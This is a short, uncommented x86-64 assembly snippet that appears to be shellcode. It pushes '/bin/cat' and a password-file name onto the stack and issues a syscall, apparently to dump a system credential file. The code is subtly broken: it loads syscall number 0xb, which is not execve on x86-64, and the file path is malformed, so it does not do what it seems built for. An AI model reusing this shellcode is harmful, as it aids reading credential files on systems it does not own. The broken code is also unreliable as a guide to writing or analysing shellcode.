BITS 64

global _start

_start:
	xor rax, rax
	push rax
	mov rdi, 0x7461632f6e69622f
	push rdi
	lea rdi, [rsp]
	push 0
	lea rsi, [rsp]
	push rsi
	mov rax, 0x206477737361702e
	push rax
	lea rsi, [rsp]
	push rsi
	mov r8, [rsp+16]
	push r8
	push rsi
	mov rsi, rsp
	mov rdx, 0
	mov al, 0xb
	syscall

